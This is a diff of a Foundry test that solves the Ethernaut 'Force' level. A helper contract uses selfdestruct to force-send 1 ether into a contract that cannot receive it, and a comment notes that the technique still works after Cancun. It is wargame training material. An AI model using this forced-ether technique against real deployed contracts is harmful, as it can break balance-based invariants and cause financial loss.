@@ -5,30 +5,31 @@ import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/Force.sol";
 
 contract MiddleMan {
-    function selfDestruct(address payable target) public payable {
+    function attack(address payable target) public payable {
         selfdestruct(target);
     }
 }
 
 // use selfdestruct() to force send ether to an address
+// note that tho after Cancun selfdestruct() no longer deletes the code, it still transfers its Ether to the beneficiary
 contract ForceTest is Test {
     Force instance;
-    MiddleMan middleMan;
-    address alice = makeAddr("alice");
 
     function setUp() public {
         instance = new Force();
-        middleMan = new MiddleMan();
-
-        vm.deal(alice, 1 ether);
     }
 
     function test() public {
         assertEq(address(instance).balance, 0);
 
-        vm.startPrank(alice);
-        middleMan.selfDestruct{value: 1 ether}(payable(address(instance)));
+        address alice = makeAddr("alice");
+        uint256 amount = 1 ether;
+        vm.deal(alice, amount);
+        MiddleMan middleMan = new MiddleMan();
 
-        assertEq(address(instance).balance, 1 ether);
+        vm.prank(alice);
+        middleMan.attack{value: amount}(payable(address(instance)));
+
+        assertEq(address(instance).balance, amount);
     }
 }
